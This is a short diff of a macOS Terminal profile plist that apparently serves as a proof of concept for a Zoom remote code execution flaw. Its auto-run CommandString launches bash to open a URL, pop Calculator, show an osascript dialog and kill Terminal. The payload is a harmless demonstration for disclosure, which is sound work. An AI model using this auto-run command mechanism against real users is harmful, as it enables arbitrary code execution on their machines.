@@ -3,7 +3,7 @@
 <plist version="1.0">
 <dict>
 	<key>CommandString</key>
-	<string>echo "Hello Philippines, Hello World." &amp;&amp; id &amp;&amp; open /System/Applications/Calculator.app;</string>
+	<string>/bin/bash -c "open 'https://secuna.io' &amp; open -a '/System/Applications/Calculator.app' &amp; sleep 0.2 &amp; osascript -e 'display dialog &#92;"AJ Dumanhug - Zoom RCE PoC&#92;"' &amp; pkill Terminal &amp;"</string>
 	<key>ProfileCurrentVersion</key>
 	<real>2.0600000000000001</real>
 	<key>RunCommandAsShell</key>
